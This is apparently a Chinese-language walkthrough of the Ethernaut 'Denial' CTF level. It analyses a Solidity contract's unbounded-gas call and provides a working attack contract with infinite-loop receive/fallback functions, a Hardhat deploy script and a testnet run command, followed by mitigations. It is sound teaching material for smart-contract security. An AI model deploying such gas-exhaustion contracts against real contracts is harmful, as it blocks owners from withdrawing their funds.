# Ethernaut - Denial 關卡

## 關卡介紹

Denial 關卡要求你成為合約的 partner 並阻止 owner 提取資金。即使合約中有足夠的資金且交易的 gas 限制為 1M 或更少，仍需確保 owner 無法成功執行 withdraw() 函數。

## 目標合約分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

## 漏洞分析

這個合約的主要漏洞在於 `withdraw()` 函數中的 `partner.call{value: amountToSend}("")` 方法：

1. **Gas 限制問題**：
   - 合約使用 `call` 方法轉帳時沒有設置 gas 限制
   - 因此 partner 合約可以消耗交易中的所有可用 gas

2. **執行順序問題**：
   - 合約先執行 partner 的轉帳，然後才執行 owner 的轉帳
   - 如果 partner 轉帳步驟消耗完所有 gas，後續步驟將無法執行

3. **缺少資金保護機制**：
   - 合約沒有防範惡意 partner 消耗過多 gas 的機制
   - 沒有提供 owner 的緊急提款機制

## 攻擊方法

我們可以創建一個惡意合約，其 `receive()` 或 `fallback()` 函數會故意消耗所有可用的 gas，使 `withdraw()` 函數無法完成執行，從而阻止 owner 獲得資金。

### 攻擊合約

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract AttackDenial {
    // 目標 Denial 合約
    IDenial public target;
    
    constructor(address _target) {
        target = IDenial(_target);
    }
    
    // 設置自己為 partner
    function attack() external {
        target.setWithdrawPartner(address(this));
    }
    
    // 在接收以太幣時消耗所有 gas
    receive() external payable {
        // 使用無限循環來消耗所有 gas
        while(true) {}
    }
    
    // 備用接收函數，以防止 receive 沒有被觸發
    fallback() external payable {
        // 同樣使用無限循環消耗所有 gas
        while(true) {}
    }
}
```

### 部署和攻擊腳本

```typescript
import hre from "hardhat";
const { ethers } = hre;

async function main() {
    console.log("開始執行 Denial 合約攻擊腳本...");

    // 目標合約的地址
    const targetAddress = "0xBBa23DbF343d46966D990dc7245577D3681ba12B";
    
    // 部署攻擊合約
    const attackFactory = await ethers.getContractFactory("AttackDenial");
    const attackContract = await attackFactory.deploy(targetAddress);
    await attackContract.waitForDeployment();
    
    // 執行攻擊，將攻擊合約設置為 partner
    await attackContract.attack();
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

## 攻擊原理

1. 我們部署 `AttackDenial` 合約並將目標 Denial 合約地址傳入構造函數
2. 通過 `attack()` 函數將攻擊合約設置為 Denial 合約的 partner
3. 當 Denial 合約執行 `withdraw()` 時，它會向攻擊合約發送資金
4. 攻擊合約的 `receive()` 函數會執行一個無限循環，消耗所有可用 gas
5. 由於 gas 耗盡，Denial 合約無法完成執行到 owner 轉帳的部分
6. 因此 owner 無法提取資金，我們成功阻止了 withdraw 操作

## 執行攻擊

```shell
npx hardhat run scripts/attackDenial.ts --network optimismSepolia
```

## 防範措施

為防止類似的漏洞，合約開發者應該：

1. **限制 Gas 使用量**：
   - 使用 `call{gas: specificAmount}` 來限制轉發給外部合約的 gas
   - 或使用 `transfer()` 或 `send()` 方法（內建 2300 gas 限制）

2. **使用拉取模式（Pull Pattern）**：
   - 改用「拉取」而非「推送」模式發送資金
   - 讓接收者自行調用提款函數，而不是主動發送

3. **Checks-Effects-Interactions 模式**：
   - 先進行所有狀態變更，最後才與外部合約交互
   - 這樣即使外部調用失敗，狀態也已經正確更新

4. **添加緊急提款機制**：
   - 為 owner 提供緊急提款函數
   - 在特殊情況下繞過正常提款流程

## 學習心得

這個關卡展示了 Solidity 中 `call` 方法的危險性：它會轉發所有可用的 gas，且不會自動回滾。相比之下，`transfer` 和 `send` 方法限制 gas 為 2300 單位，可以減少此類攻擊的風險。

總之，在處理資金轉移時，始終要謹慎設計交互模式，並遵循已驗證的安全模式。
